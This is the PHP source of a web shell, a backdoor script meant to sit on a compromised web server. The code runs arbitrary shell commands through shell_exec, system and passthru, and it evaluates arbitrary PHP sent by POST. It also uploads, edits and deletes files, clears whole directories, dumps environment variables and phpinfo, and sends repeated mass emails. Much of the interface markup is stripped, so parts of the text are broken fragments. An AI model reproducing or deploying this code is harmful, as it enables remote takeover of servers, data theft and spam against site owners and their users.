<?php
if (!function_exists(rename_all)) {
    function rename_all($dir,$prefix,$name,$del) {
     $r_dir=opendir($dir);
       while (false !== ($file_r = readdir($r_dir))) {
         if (@filetype($dir."/".$file_r)=="file") {
           $i++;
        @copy($dir."/".$file_r,$dir."/".$i.".".$prefix.$name) or die ("[-]Error renaming file : ".$file_r."");
         if ($del=="yes") {
          @unlink($dir."/".$file_r) or die ("[-]Error deleting file(s)!");
        }
       }
       
      }
       echo "Successfully renamed file(s)!";
    }
  }
        
        

if (!function_exists(get_perms)) {
     function get_perms($file) {
    if (@file_exists($file)) {
      if (@is_readable($file)) {
        echo "<b>R</b>";
         }
           if (@is_executable($file)) {
            echo "<b>E</b>";
             }
               if (@is_writable($file)) {
                echo "<b>W</b>";
                }
              } else {
                 echo "[-]Error";
               }
            }
          }

if (!function_exists(search_file)) {
   function search_file($search,$dir) {
    global $word;
     global $surl;
    $d_s=opendir($dir);
    while (false !== ($file_s = readdir($d_s))) {
      if (preg_match("/".$search."/i",$file_s))   {
         echo "<a href=".$surl."?&".$word."&file_browser&file=".urlencode($dir)."/".urlencode($file_s).">".$file_s."</a><br>";
         }
       }
     }
   }


if (!function_exists(copy_file)) {
    function copy_file($file,$to) {
   if (@file_exists($file)) {
     @copy($file,$to) or die ("[-]Error copying file!");
      echo "Successfully copied file!";
       } else {
           echo "[-]File Doesnt exist!";
       }
    }
 }

if (!function_exists(send_mail)) {
   function send_mail($from,$to,$text,$subject,$times) {
              while ($i<$times) {
               $i++;
               $header  = "From: $from\r\n";    
                @mail($to, $subject, $text, $header) or die ("[-]Error sending mail(s)!");

              }
                   echo "Successfully sent mail(s) to ".$to."!";
   }
 }


if (!function_exists(read_file)) {
   function read_file($file) {
$file=@fopen($file,"r");
echo fread($file,10000);
fclose($file);
       }
     }

if (!function_exists(write_file)) {
   function write_file($file,$text) {
     if (@is_writable($file)) {
      if (@file_exists($file)) {
        $file_w=@fopen(urldecode($file),"w") or die ("[-]Error");
         if (fwrite($file_w,$text)) {
            echo "Successfully written to file(s)!";
          }
        }
     }
           else {
           echo "[-]Error";
            exit;
     }
   }
 }
      


if (!function_exists(count_all)) {
     function count_all($dir) {
       $c_d=opendir($dir);
        while (false !== ($file_c = readdir($c_d))) {
         if (@filetype($dir."/".$file_c)=="file") {
            $file_c_s++;
         } 
           else 
         { 
            $dir_c++;
         }
        }
       echo "Directories:";
        echo $dir_c++;
         echo "||";
          echo "Files:";
            echo $file_c_s;
     }
}

if (!function_exists(check_access)) {
   function check_access($file) {
     if (@is_readable($file)) {
       echo "R";
        }
         if (@is_executable($file)) {
           echo "E";
             } 
              if (@is_writable($file)) {
                echo "W"; 
                 }
              } 
           }

if (!function_exists(clear_dir)) {
   function clear_dir($dir) {
$o_d=opendir($dir);
   while (false !== ($file = readdir($o_d))) {
    if (@filetype(urldecode($_GET['file'])."/".$file)=="file") {
unlink(urldecode($dir)."/".$file) or die ("[-]Error @ file:".$file."");
   }
 }
echo "Successfully cleared directory!";
   }
 }

?><?php
// real code start !


if (isset($_GET['update'])) {
echo "<center><table border=\"1\" rules=\"groups\">
  <thead>
    <tr><td>";
check_update();
exit;
}
if (isset($_GET['rmdir']))  {
echo "<center><table border=\"1\" rules=\"groups\">

  <thead>
    <tr><td>";
@rmdir($_GET['file']) or die ("[-]Error deleting dir!");
echo "Successfully deleted dir(s)!";
exit;
}


if (isset($_GET['upload'])) {
$uploaddir = urldecode($_POST['file']);

print "<pre>";
if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir ."/". $_FILES['userfile']['name'])) {
echo "<center><table border=\"1\" rules=\"groups\">
  <thead>
    <tr><td>";
   print "Successfully uploadet file(s)!";
} else {
echo "<center><table border=\"1\" rules=\"groups\">
  <thead>
    <tr><td>";
   print "[-]Error";
}
exit;
}

if (isset($_GET['search'])) {
echo "<center><table border=\"1\" rules=\"groups\">
  <thead>

    <tr><td>";
search_file($_POST['search'],urldecode($_POST['dir']));
exit;
}




if (isset($_GET['getenv'])) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">
  <thead><br>
    <tr><td>";
echo getenv($_GET['getenv']);
exit;
}


if (isset($_GET['php_info'])) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">
  <thead><br>
    <tr><td>";
phpinfo();
exit;
}

if (isset($_GET['defined_vars'])) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">
  <thead><br>
    <tr><td>";
echo "<center><textarea rows=40 cols=120>";
$vars=get_defined_vars();
print_r($vars);
echo "</textarea>";

exit;
}

if (isset($_GET['env'])) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">

  <thead><br>
    <tr><td>";
$ary=get_defined_vars();
$it=array_keys($ary);
foreach ($it as $i) {
echo "<a href=".$surl."?&".$word."&getenv=".$i.">".$i."</a><br>";

}
exit;
}

if (isset($_GET['play'])) {
echo "<embed src=".urlencode($filename)." autostart=true loop=true hidden=true height=0 width=0>";
exit;
}


if (isset($_GET['special_crypt'])) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">
  <thead><br>
    <tr><td>";
echo "<textarea rows=15 cols=90>";
if (isset($_POST['submit'])) {
$file=@fopen($_FILES['userfile']['tmp_name'],"r") or die ("[-]Error reading file!");
$meth=$_POST['crypt'];
if ($meth=="1") {
echo htmlspecialchars(md5(fread($file,10000)));
 } elseif ($meth=="2") {
      echo htmlspecialchars(crypt(fread($file,10000)));
}
    elseif ($meth=="3") {
     echo htmlspecialchars(sha1(fread($file,10000)));
  }
elseif ($meth=="4") {
     echo htmlspecialchars(crc32(fread($file,10000)));
}
   elseif ($meth=="5") {
     echo htmlspecialchars(urlencode(fread($file,10000)));
}

   elseif ($meth=="6") {
     echo htmlspecialchars(urldecode(fread($file,10000)));
}
   elseif ($meth=="7") {
     echo htmlspecialchars(base64_encode(fread($file,10000)));
}

elseif ($meth=="8") {
     echo htmlspecialchars(base64_decode(fread($file,10000)));
}

}
echo "</textarea><div align=left>";

?><?php echo $surl ?><?php echo $word ?><?php
exit;
}
if (isset($_GET['crypt'])) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">
  <thead><br>
    <tr><td>";
?><?php echo $surl ?><?php echo $word ?><?php
$text=$_POST['crypt'];
?><?php echo htmlspecialchars(md5($text)) ?><?php echo htmlspecialchars(crypt($text)) ?><?php echo htmlspecialchars(sha1($text)) ?><?php echo htmlspecialchars(crc32($text)) ?><?php echo  htmlspecialchars(urlencode($text)) ?><?php echo htmlspecialchars(urldecode($text)) ?><?php echo base64_encode($text) ?><?php echo base64_decode($text) ?><?php
echo "<input type=submit value=Start></form><form action=".$surl."?&".$word."&special_crypt method=post><input type=submit value=file_inload_crypt>";
exit;
}

if (isset($_GET['php_code'])) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">
  <thead><br>
    <tr><td>";
?><?php echo $surl ?><?php echo $word ?><?php
eval($_POST['code']);
echo "</textarea>";
echo "<br><br><input type=submit value=Start>";
exit;
}

if (isset($_GET['search_st'])) {
   if (isset($_POST['search'])) {
search_file($_POST['search'],$_POST['dir']);
 }
exit;
}


if (isset($_GET['rename_all'])) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">
  <thead><br>
    <tr><td>";
rename_all(urldecode($_POST['d']),$_POST['prefix'],$_POST['name'],$_POST['del']);
exit;
}

if (isset($_GET['special_d'])) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">
  <thead><br>
    <tr><td>";
 $way=$_POST['way'];
   if ($way=="1") {
clear_dir($_GET['file']);
   exit;
  }
    if ($way=="2") {
echo "<center><table border=\"1\" width=600 rules=\"groups\">
  <thead><br>

    <tr><td>";
?><?php echo $surl ?><?php echo $word ?><?php echo urlencode($filename) ?><?php
exit;
}
}


if (isset($_GET['special_dir'])) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">
  <thead><br>
    <tr><td>";
?><?php echo $surl ?><?php echo $word ?><?php echo urlencode($filename) ?><?php echo urlencode($filename) ?><?php
exit;
}

if (isset($_GET['delete'])) {
   if (@file_exists($filename)) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">
  <thead>
    <tr><td>";
    @unlink($filename) or die ("[-]Error deleting file!");
     echo "Successfully Deleted File!";
      exit;
   }
}

if (isset($_GET['save'])) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">

  <thead>
    <tr><td>";
     write_file(urldecode($_POST['file']),stripslashes($_POST['text']));
   
   exit;
}

if (isset($_GET['exec'])) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">
  <thead>
    <tr><td><center>";
@chdir(urldecode($_POST['dir']));
echo "<textarea rows=15 cols=114>";
echo shell_exec($_POST['command']);
echo "</textarea>";
exit;
}


if (isset($_GET['mkdir'])) {
   if (isset($_POST['name'])) {
echo "<center><table border=\"1\" rules=\"groups\">
  <thead>
    <tr><td>";
     mkdir(urldecode($_POST['dir'])."/".$_POST['name']) or die ("[-]Error creating dir!");
     echo "Successfully created dir!";
   }
exit;
}

if (isset($_GET['mkfile'])) {
   if (isset($_POST['name'])) {
echo "<center><table border=\"1\" rules=\"groups\">

  <thead>
    <tr><td>";
$dir=urldecode($_POST['dir']);
$filed=$_POST['name'];

       if (@file_exists($dir."/".$filed)) {
     echo "[-]Allready exists!";
      exit;
     }
    $file_c=@fopen($dir."/".$filed,"w") or die ("[-]Can't create file!");
     echo "Scuessfully created file(s)!";
   }
exit;
}

if (isset($_GET['edit'])) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">
  <thead>
    <tr><td>";
   if (@file_exists($filename)) {
     echo "<form action=".$surl."?&".$word."&save method=post><textarea rows=15 cols=90 name=text>";
      read_file($filename);
       echo "</textarea><br><br><input type=hidden name=file value=".urlencode($_GET['file'])."><input type=submit name=sub value=Save>";
       }
    exit;
}



if (isset($_GET['copy_start'])) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">
  <thead>
    <tr><td>";
copy_file($_POST['from'],$_POST['to']);
exit;
}



if (isset($_GET['copy_file']))  {
echo "<center><table border=\"1\" width=600 rules=\"groups\">

  <thead>
    <tr><td>";
?><?php echo $surl ?><?php echo $word ?><?php echo realpath($filename) ?><?php echo realpath($filename) ?><?php
exit;
}

if (isset($_GET['send_mail_st'])) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">
  <thead>

    <tr><td>";
if (isset($_POST['from'])) 
{
if (isset($_POST['to'])) 
{
if (isset($_POST['text'])) 
{
if (isset($_POST['subject']))
{
if (isset($_POST['times']))
{
send_mail($_POST['from'],$_POST['to'],$_POST['text'],$_POST['subject'],$_POST['times'])  ; 
exit;
}
}
}
}
}
}
if (isset($_GET['send_mail'])) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">
  <thead>
    <tr><td>";
?><?php echo $surl ?><?php echo $word ?><?php
exit;
}
if (isset($_GET['file_browser'])) {

   for ($i=0;$i<4;$i++) {
     if (preg_match("/".$file_tps["img"][$i]."/i",$extn)) {
echo "<center><table border=\"1\" rules=\"groups\">
  <thead>
    <tr><td>";
     echo "<a href=".$surl."?&".$word."&file_browser&file=".urlencode($filename)."&img><img src='".urldecode($surl)."?&".$word."&file=".urldecode($filename)."&img' height= width= border=0><br>";
  exit;
}  }



if (@filetype($j_f)=="file") {
echo "<center><table border=\"1\" rules=\"groups\" 
  <thead>
    <tr><td>";
highlight_file($j_f);

exit;
}
echo "<center><table border=\"1\" rules=\"groups\">
  <thead>
    <tr>

      <th></th><td>";
count_all($j_d);
echo "</tr>";
echo "<center><table border=\"1\" rules=\"groups\">
  <thead>
    <tr>
      <th>Filename</th><th>Edit</th><th>Copy</th><th>Download</th><th>Delete<th>Perms</th><th>Access</th> ";




$o_d=opendir($j_d);



   while (false !== ($file = readdir($o_d))) {
     echo " <tbody>

    <tr>
      <td>";
if (@filetype($j_d."/".$file)=="dir") {
echo "</a><img  src=".$surl."?&".$word."&dir&pic=dir height=12 width=><a href=".$surl."&".$word."&&file_browser&file=".urlencode($j_d)."/".urlencode($file).">[".$file."]";
} else {
echo "<img  src=".$surl."?&".$word."&dir&pic=ext_wri height=9 width=><a href=".$surl."&".$word."&&file_browser&file=".urlencode($j_d)."/".urlencode($file).">";
echo $file;
}
echo "<br></a></td><td><a href=".$surl."&".$word."&edit&file_browser&file=".urlencode($j_d)."/".urlencode($file).">";
if (@filetype($j_d."/".$file)=="file") {
echo "<center>[Edit]";
}
else {
echo "</a><center>[-]";
}
echo "</a></td><td><a href=".$surl."&".$word."&copy_file&file_browser&file=".urlencode($j_d)."/".urlencode($file).">";
if (@filetype($j_d."/".$file)=="file") {
echo "<center>[Copy]";
} else {
echo "</a><center>[-]";
}
echo "</a></td><td><a href=".$surl."&".$word."&download&file_browser&file=".urlencode($j_d)."/".urlencode($file).">";
if (@filetype($j_d."/".$file)=="file") {
echo "<center>[Download]";
} else {
echo "</a><center>[-]";
}
echo "</a></td><td><a href=".$surl."&".$word."&delete&file_browser&file=".urlencode($j_d)."/".urlencode($file).">";
if (@filetype($j_d."/".$file)=="file") {
echo "<center>[Delete]";
} else {
echo "</a><center><a href=".$surl."&".$word."&rmdir&file_browser&file=".urlencode($j_d)."/".urlencode($file).">[Delete]</a>";
} 
echo "<td><center>";
echo @fileowner($j_f."/".$file);
echo "</td>";
echo "<td><center>";
get_perms(fileperms($j_f."/".$file));
echo "</td>";
echo "</a></td>";
 }
echo "<center><table width=360 height=40 border=\"1\" rules=\"groups\">

  <thead>
    <tr>
      <th></th><td>";
?><?php echo $surl ?><?php echo $word ?><?php echo urlencode($_GET['file']) ?><?php
if (@is_writable($j_d)) {
echo "<font color=green>[Ok]</font>";
  } else {
echo "<font color=red>[No]</font>";
 }
?><?php
echo "</td><center><table width=360 height=40 border=\"1\" rules=\"groups\">
  <thead>
    <tr>
      <th></th><td>";
?><?php echo $surl ?><?php echo $word ?><?php echo urlencode($_GET['file']) ?><?php

echo "</td><center><table width=360 height=40 border=\"1\" rules=\"groups\">
  <thead>

    <tr>
      <th></th><td>";
?><?php echo $surl ?><?php echo $word ?><?php echo urlencode($_GET['file']) ?><?php
if (@is_writable($j_d)) {
echo "<font color=green>[Ok]</font>";
  } else {
echo "<font color=red>[No]</font>";
 }
echo "</td><center><table width=360 height=40 border=\"1\" rules=\"groups\">

  <thead>
    <tr>
      <th></th><td>";
?><?php echo $surl ?><?php echo $word ?><?php echo urlencode($_GET['file']) ?><?php
if (@is_writable($j_d)) {
echo "<font color=green>[Ok]</font>";
  } else {
echo "<font color=red>[No]</font>";
 }
echo "</td><center><table width=360 height=40 border=\"1\" rules=\"groups\">

  <thead>
    <tr>
      <th></th><td>";
?><?php echo $surl ?><?php echo $word ?><?php echo urlencode($_GET['file']) ?><?php
echo "</td><center><table border=\"1\" rules=\"groups\">
  <thead>
    <tr>

      <th></th><td><a href=".$surl."?&".$word."&special_dir&file=".urlencode($filename).">Special DirOptions</a></td> ";
echo "</a>";
exit;
  }
?><?php echo $surl ?><?php echo $word ?><?php echo  "." ?><?php echo $surl ?><?php echo $word ?><?php echo $surl ?><?php echo $word ?><?php echo $surl ?><?php echo $word ?><?php echo $surl ?><?php echo $word ?><?php echo $surl ?><?php echo $word ?><?php echo $surl ?><?php echo $word ?><?php echo $surl ?><?php echo $word ?><?php echo $surl ?><?php echo $word ?><?php
if (isset($_GET['exec_st'])) {
    $meth=$_POST['method'];
      $com=$_POST['command'];
        if (isset($meth)) {
          if ($meth=="1") {
            echo shell_exec($com);
              }
               elseif($meth=="2") {
                 echo system($com); 
                   }
                  elseif ($meth=="3") {
                    passthru($com);
                     }
                       elseif ($meth=="4") {
                         if (function_exists(shell_exec)) {
                            echo shell_exec($com);
                              }
                                 elseif (function_exists(system)) {
                                   echo system($com);
                                     }
                                       elseif (function_exists(passthru)) {
                                         echo passthru($com);
                                           }
                                             else {
                                              echo "[-]Error";
                                             }    
                                          }
                                       }
                                    }
echo "</textarea>";
exit;
?>